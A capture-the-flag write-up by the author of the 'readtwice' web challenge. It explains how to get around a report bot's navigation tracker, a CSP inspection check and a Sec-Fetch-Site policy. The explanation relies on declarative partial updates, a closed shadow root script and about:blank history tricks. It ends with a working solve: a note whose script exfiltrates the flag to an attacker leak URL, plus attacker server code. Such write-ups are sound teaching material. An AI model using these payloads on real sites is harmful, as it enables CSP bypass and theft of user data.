# readtwice
 
# Challenge Architecture

This challenge is pretty much the same as **readonce** but with a few changes: 

1. `currentReview` object now has a new property, `finalized` and `consumeReport()` now checks on it.

2. `/create`:
create now uses `inspectDocument()` to create the note. If you didn't pass it, the note will not be created.

3. `/review`:
review doesn't load the attacker JS in a sandboxed iframe anymore. Instead, it creates a [MessageChannel](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel) and sends the second port to `/sandbox` while it keeps the first one. If it receives a message "ready" from the second port, a POST request to `/complete` will be made.

4. `/sandbox`:
Sandbox loads the attacker note

5. `/reports/check`:
This endpoint now has `Cache-Control: no-store` header to make sure there are no responses cached under it. same `policy()`, `consumeReport()` checks need to be passed to render your note, but `consumeReport()` check has a little change: it now checks on `.finalized` property, and the state check is gone.

## bot flow
The bot flow is totally changed; the bot now has:

- `locationKey()`: this function simply returns the URL it takes.
- `isReportDocument()`: this function checks if the URL it takes is the same as `http://localhost:3000/reports/check?rid=` or not
- `watchDocument()`: this is like a tracker of the URL the attacker sends. It observes top-level navigations the attacker's page does, as you can see here:
```js
function watchDocument(page, report, entryUrl) {
  const entry = locationKey(entryUrl);
  let entered = false;
  let diverged = false;

  page.on("request", (request) => {
    if (!request.isNavigationRequest() || request.frame() !== page.mainFrame()) {
      return;
    }

    const next = request.url();

    if (!entered) {
      entered = locationKey(next) === entry;
      diverged = !entered;
      return;
    }

    if (isReportDocument(next, report)) {
      report.finalized = report.approved && !diverged;
      return;
    }

    if (locationKey(next) !== entry) {
      diverged = true;
      report.finalized = false;
    }
  });
}
```
First, it creates an `entry`. This entry is the first URL the bot visits; then it listens for navigations that URL does. If that navigation is the same as the entry, the `if (!entered)` condition block of code executes; otherwise, the `if (locationKey(next) !== entry)` block executes.

- `inspectDocument()`: this function is used when creating your notes on `/create` endpoint, and it's based on a previous [sekai challenge](https://blog.ankursundara.com/htmlsandbox-writeup/) that I encourage you to read. That solve won't work here tho, cause it requires a lot of padding, a missing charset, and an attacker controlling raw bytes, while we have a limited set of characters when creating notes `.slice(0, 512)` and we serve the note with `res.type("html").send(note.html);`.

- `review()`: it's the same as before, but it completes every process on separate pages.

Those are the changes. Same as before, we need to pass `police()` and `consumeReport()` checks to render our note. lets start with `consumeReport()`:
consumeReport now has a new property `.finalized` that checks it. This property is set to true only under this condition `if (isReportDocument(next, report))` so we need to know how to satisfy `isReportDocument()` to make the condition code execute:
```js
function isReportDocument(value, report) {
  const url = new URL(value);
  const app = new URL(APP_URL);

  return url.origin === app.origin
    && url.pathname === "/reports/check"
    && url.searchParams.get("rid") === report.id;
}
```
It checks if the URL that the attacker sends matches `http://localhost:3000/reports/check?rid=` or not. Simple, we just send that URL, and we're fine. Well... the thing is, when you send the URL for the first time, it will go into the `if (!entered)` block first cause `entered` is false. The block of code will execute; then `entered` is set to true cause `locationKey(next) === entry` will evaluate to true, and we will exit the event callback cause of `return`.

You can pass this by simply sending the bot your page `http://test.com` which will make `entered` true, then navigate the page to `http://localhost:3000/reports/check?rid=`. The event handler from the bot will listen to this navigation; `entered` is true this time, so `if (!entered)` block will not execute; instead, the `if (isReportDocument(next, report))` block will execute `report.finalized = report.approved && !diverged;` and make `.finalized` true (I made this handler to prevent some unintendeds, but I think I made the intended more obvious instead :) ). So we need to make sure `report.approved` is true and `diverged` is false to make `.finalized` true.

Making `diverged` false is easy; we just need to make sure the bot never navigates to a different URL than the entry (the URL it starts with), so this `locationKey(next) === entry` becomes true. You might ask: but when we send `http://test.com` to the bot and then navigate it to `http://localhost:3000/reports/check?rid=` that's actually a different URL than the entry, so `locationKey(next) !== entry` will be true and set `diverged` to true? Not really, cause in this point we are already in the `if (isReportDocument(next, report))` block now, and because it has `return` at the end, it will exit the handler callback.

Making `report.approved` true is the same as before; we need to make a request to `/complete`. That only happens at `/review` which has: 
1. a sandboxed iframe to `/sandbox` that loads the attacker note
2. a `MessageChannel` that sends the second port to `/sandbox` while it has the first one. If it receives a message "ready" from the second port, a post request to `/complete` will be made.

## passing `inspectDocument()` & `consumeReport()`
That means we need a script execution when we create the note. But we have `inspectDocument()` that requires us to set a CSP with `default-src 'none'` and an empty body. The trick here was the new [DPU](https://developer.chrome.com/blog/declarative-partial-updates) feature. The required shape should look like:
```html
<!doctype html>
<html>
  <head>
    <meta http-equiv="Content-Security-Policy" content="default-src 'none'">
  </head>
  <body>
    <div></div>
  </body>
</html>
```
With DPU, you can use `template` tag with `?marker` attribute for replacements:
```html
<!doctype html><html><head><?marker name='p'?></head><body>
<div><template shadowrootmode=closed><script>
  // your script
</script></template></div>
<template for=p>
  <meta http-equiv=Content-Security-Policy content="default-src 'none'">
</template>
</body></html>
```
When the browser parses this, the tokenizer first will see `<?` and it will switch to [Processing instruction open state](https://html.spec.whatwg.org/multipage/parsing.html#tag-open-state), and because we are inside `head` tag, a [ProcessingInstruction](https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-inhead) node will be created.

After that, the parser will see `<template shadowrootmode=closed>`, it will attach a closed shadow root to the `<div>` and the `<script>` becomes a child of the shadow root. Once the parser sees `</script>` it will execute the [script](https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-incdata#:~:text=prepare%20the%20script%20element%20script). Then it will see `<template for` and it will start the DPU replacement process.

The declarative closed shadow root becomes the `<div>` internal shadow tree and will not be visible in the light dom. After parsing, the above shape will be:
```html
<html>
  <head>
    <meta http-equiv="Content-Security-Policy" content="default-src 'none'">
  </head>
  <body>
    <div></div>
  </body>
</html>
```
From this, you can see there is a timing gap between the script execution and the DPU replacement. The declarative closed shadow root script can execute before the later DPU-installed CSP meta takes effect, and it will pass `inspectDocument()` check. So when `/review` sandbox iframe `/sandbox` and `/sandbox` loads the note, it will execute the script and send ready to the first port at `/review` then a request to `/complete` will be made, and `report.approved` will be true. By this, `.finalized` will be set to true later by the bot, and here we pass `consumeReport()` check. Now we need to pass `policy()` check.

## passing `policy()`
`policy()` is the same as before, but the attack is totally different. Last time we abused the bfcache navigation size; this time we gonna use windows and i really want you to read [this](https://m0z.ie/research/2025-12-19-Seccon-CTF-2025-Writeups-Web/#initiator-null) writeup this time. Basically, if you send a URL to the bot `https://test.com`, the bot will treat this as a fresh top-level browser navigation and it has no initiator, so Chrome will send `Sec-Fetch-Site: none`. If you navigate this page to `https://example.com`, it will have a `test.com` initiator; doing `history.back()` will navigate the page back to `https://test.com` again with its initiator, which is null in this case. Make sure to know that 3XX redirects **do NOT modify** the value of the initiator. That's exactly what we gonna do.

First, send this URL to the bot `https://attacker.com`. navigate the page to `https://example.com` then do `history.back()` to go back `https://attacker.com` again. The attacker domain will send a redirect response to `http://localhost:3000/reports/check?rid=` this time to pass `isReportDocument()`, which requires the URL to be `http://localhost:3000/reports/check?rid=` like I said. by this, we pass `policy()`, `isReportDocument()` and `.finalized` is true. No!

This can pass `policy()` yes, but we still have a navigation tracker on the bot that listens to the navigations the attacker page does. If we are on `https://attacker.com` and navigate to `https://example.com`, `watchDocument()` will catch this. we start at `https://attacker.com` and `watchDocument()` has:
```js
let entered = false;
let diverged = false;
```
The `if (!entered)` will execute and set `entered` to true cause `entry` and `locationKey(next)` have the same URL. later when you navigate to `https://example.com`, `watchDocument()` will catch it, now it has:
```js
let entered = true;
let diverged = false;
```
cause `entered` is already true, the `if (!entered)` will be skipped. Instead, the `if (locationKey(next) !== entry)` block will execute cause the URL changed from the entry. It will set `diverged` to true and `.fanilized` to false.

You can fix this by navigating the page to `about:blank` instead. `about:blank` is a blank page represented in the browser with a local scheme. It doesn't make an HTTP request, so the bot will not catch it. Also, it [inherits](https://html.spec.whatwg.org/dev/browsing-the-web.html#navigation-create-document-state) the initiator from the previous page, like if you are at `http://test.com` and navigate to `about:blank`, the initiator will be `test.com`. If you navigate again to `http://example.com` the initiator is still `test.com`.

## solve

make a note:
```html
<!doctype html><html><head><?marker name='p'></head><body><div><template shadowrootmode=closed><script>if(top!==self)onmessage=e=>e.ports[0].postMessage("ready");else fetch("/api/flag").then(r=>r.json()).then(x=>location="https://attacker/leak?d="+encodeURIComponent(x.flag))</script></template></div><template for=p><meta http-equiv=Content-Security-Policy content="default-src 'none'"></template></body></html>
```

On the attacker page, you will open a window (W1) to `/review?rid=<id>` to start the `/complete` process. After it finishes, make the opener (W0 => attacker page) bring it (W1) back again to the attacker origin. After that, W1 will redirect its opener (W0) to `about:blank` then make it execute `history.back()`. On going back, W0 will have a redirect response to `http://lcoalhost:3000/reports/check?rid=`. All the checks will be passed by then, and the bot will render our note and execute the script:
```js
const app = "http://localhost:3000";

function page(body) {
  return new Response(`<!doctype html><meta charset="utf-8"><script>${body}</script>`, {
    headers: {
      "content-type": "text/html; charset=utf-8",
      "cache-control": "no-store",
    },
  });
}

export default {
  async fetch(request) {
    const requestUrl = new URL(request.url);

    if (requestUrl.pathname !== "/") {
      return new Response("not found", { status: 404 });
    }

    const rid = requestUrl.searchParams.get("rid");
    if (!rid) {
      return new Response("no rid", { status: 400 });
    }

    const completed = (request.headers.get("cookie") || "").split(";").some((part) => part.trim() === "complete=1");

    if (completed) {
      const final = new URL("/reports/check", app);
      final.searchParams.set("rid", rid);
      return Response.redirect(final.href, 302);
    }

    const review = new URL("/review", app);
    review.searchParams.set("rid", rid);
    const reviewUrl = JSON.stringify(review.href);

    return page(`
      if (!window.opener) {
        const helper = window.open(location.href, "readtwice");
        setTimeout(() => helper.location = location.href, 1500);
      } else if (!sessionStorage.getItem("reviewed")) {
        sessionStorage.setItem("reviewed", "1");
        location.replace(${reviewUrl});
      } else {
        document.cookie = "complete=1; Path=/; SameSite=Lax";
        const primary = window.opener;
        primary.location = "about:blank";
        setTimeout(() => primary.history.back(), 250);
      }
    `);
  },
};

```
